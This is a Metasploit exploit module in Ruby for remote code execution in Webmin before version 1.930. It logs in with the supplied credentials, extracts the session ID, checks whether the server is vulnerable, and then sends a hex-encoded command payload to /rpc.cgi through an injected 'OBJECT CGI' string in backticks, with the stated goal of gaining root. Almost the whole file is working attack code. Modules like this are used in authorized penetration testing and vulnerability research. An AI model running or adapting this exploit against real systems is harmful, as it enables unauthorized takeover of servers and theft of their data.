##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Webmin < 1.930 Remote Code Execution",
      'Description'    => %q{
      This exploit takes advantage of a code execution issue within the function
      unserialise_variable() located in web-lib-funcs.pl, in order to gain root.
      The only prerequisite is a valid session id.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'James Bercegay', # Vulnerability Discovery
        ],
      'References'     =>
        [
          [ 'URL', 'https://www.gulftech.org/' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Targets'        => [ ['Automatic', {}] ],
      'DisclosureDate' => '2019/08/30',
      'DefaultTarget'  => 0))

      register_options(
      [
        OptString.new('WMPORT',   [ true,  "Webmin port",     '10000']),
        OptString.new('WMUSER',   [ true,  "Webmin username", 'test']),
        OptString.new('WMPASS',   [ true,  "Webmin password", 'test']),
      ])
  end

  def check

    # Set Webmin port
    datastore['RPORT'] = datastore['WMPORT']

    # Verbose
    print_status("Attempting to login")

    # Send login request
    res = send_request_cgi(
      {
        'uri'       =>  '/session_login.cgi',
        'method'    => 'POST',
        'vars_post' =>
          {
            'user' => datastore['WMUSER'],
            'pass' => datastore['WMPASS'],
            'save' => '1'
          },
        'cookie' => "redirect=1; testing=1; sessiontest=1;"
      })

    # If succesful cookie will be set
    if ( res and res.headers['Set-Cookie'] )
      # Do we have a valid SID?
      if ( /sid=/.match(res.headers['Set-Cookie']) )
        # Extract the SID
        sid = /sid=([a-z0-9]+);/.match(res.headers['Set-Cookie'])[1]
        print_good("Login was successful")
      else
        # No dice
        print_bad("Unable to login")
        return Exploit::CheckCode::Safe
      end
    else
        # No dice
        print_bad("Unexpected response")
        return Exploit::CheckCode::Safe
    end

    # Verbose
    print_status("Checking if host is vulnerable")

    # Try to execute arbitrary code
    res = send_request_cgi({
        'uri'          => '/rpc.cgi',
        'method'       => 'POST',
        'headers'      =>
        {
          'Referer' => 'http://' + datastore['RHOST'] + ':' + datastore['RPORT'].to_s
        },
        'data'   => 'OBJECT CGI;print "Content-Type: text/metasploit\n\n"',
        'cookie' => 'redirect=1; testing=1; sessiontest=1; sid=' + sid
      })

    # If it works our custom Content-Type will be set
    if ( res.headers['Content-Type'] and res.headers['Content-Type'] == "text/metasploit" )
      # Good
      return Exploit::CheckCode::Vulnerable
    else
      # Bad
      return Exploit::CheckCode::Safe
    end
  end

  def exploit

    # Set Webmin port
    datastore['RPORT'] = datastore['WMPORT']

    # Verbose
    print_status("Attempting to login")

    # Send login request
    res = send_request_cgi(
      {
        'uri'       =>  '/session_login.cgi',
        'method'    => 'POST',
        'vars_post' =>
          {
            'user' => datastore['WMUSER'],
            'pass' => datastore['WMPASS'],
            'save' => '1'
          },
        'cookie' => "redirect=1; testing=1; sessiontest=1;"
      })

    # If succesful cookie will be set
    if ( res and res.headers['Set-Cookie'] )
      # Do we have a valid SID?
      if ( /sid=/.match(res.headers['Set-Cookie']) )
        # Extract the SID
        sid = /sid=([a-z0-9]+);/.match(res.headers['Set-Cookie'])[1]
        print_good("Login was successful")
      else
        # No dice
        print_bad("Unable to login")
        return
      end
    else
        # No dice
        print_bad("Unexpected response")
        return
    end

    # Verbose
    print_status("Sending selected payload")

    # Hex encode payload to prevent problems with the payload getting mangled
    hex = '\x' + payload.encoded.scan(/./).map{ |x| x.unpack('H*') }.join('\x')

    # Send selected payload
    res = send_request_cgi({
        'uri'          => '/rpc.cgi',
        'method'       => 'POST',
        'headers'      =>
        {
          'Referer' => 'https://' + datastore['RHOST'] + ':' + datastore['RPORT'].to_s
        },
        'data'   => 'OBJECT CGI;`' + hex + '`',
        'cookie' => 'redirect=1; testing=1; sessiontest=1; sid=' + sid
      })
    end
end